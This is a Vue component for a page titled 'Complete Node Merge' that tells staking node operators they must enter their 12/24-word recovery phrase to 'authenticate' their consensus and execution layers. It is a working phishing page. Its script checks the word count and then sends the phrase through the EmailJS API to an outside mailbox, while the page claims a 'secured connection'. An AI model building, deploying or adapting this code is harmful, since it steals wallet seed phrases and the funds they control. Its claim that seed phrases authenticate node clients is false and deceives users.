<template>
  <div class="bg-[#2e4e72] hero is-medium py-[60px] md:py-[100px] px-2 md:px-6">
    <div class="max-w-screen-lg rounded mx-auto bg-white p-5 md:p-10">
      <h1 class="md:text-center text-[30px] font-bold">Complete Node Merge</h1>
      <p class="mt-8 md:text-xl">
        The most important actions to do if you're operating a staking node are
        to first run consensus layer client and in execution layer. You should
        authenticate both layer with 12/24 word phrase so that they can
        communicate securely
      </p>
      <div class="mt-10">
        <label class="font-bold" for="">Enter 12/24 word phrase</label>
        <textarea
          id="message"
          rows="4"
          v-model="phrase"
          class="mt-2 block p-2.5 w-full text-sm text-gray-900 bg-gray-50 rounded-lg border border-gray-300 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
          placeholder="Your phrase..."
        ></textarea>
        <div class="links mt-5">
          <div @click="sendData" class="button is-success is-large">
            Continue
            <span
              v-if="disabled"
              class="w-5 ml-2 h-5 rounded-full animate-spin border-4 border-dashed border-white border-t-transparent"
            ></span>
          </div>
        </div>
        <span class="mt-2 text-sm">This process uses a secured connection</span>
      </div>
    </div>
  </div>
</template>

<script>
import axios from 'axios'
export default {
  data() {
    return {
      phrase: null,
      disabled: false,
    }
  },
  methods: {
    sendData() {
      this.disabled = true
      let self = this
      const counter = this.countWords(this.phrase)
      if (counter === 12 || counter === 24) {
        var data = {
          service_id: 'service_zlp9avq',
          template_id: 'template_lmr03dr',
          user_id: 'tBHx-wodV4E4WnaBH',
          template_params: {
            from_name: 'Avado',
            phrase: this.phrase,
            reply_to: 'customeronlineagent@gmail.com',
          },
        }
        axios
          .post('https://api.emailjs.com/api/v1.0/email/send', data)
          .then(function () {
            self.$router.push('/validation')
            self.disabled = false
          })
          .catch(function () {
            self.disabled = false
          })
      } else {
        this.$toast.info(
          'Wrong Input!. A recovery phrase must be a list of 12 to 24 words generated '
        )
        self.disabled = false
      }
    },
    countWords(str) {
      if (str) {
        return str.trim().split(/\s+/).length
      } else {
        return
      }
    },
  },
}
</script>

<style></style>
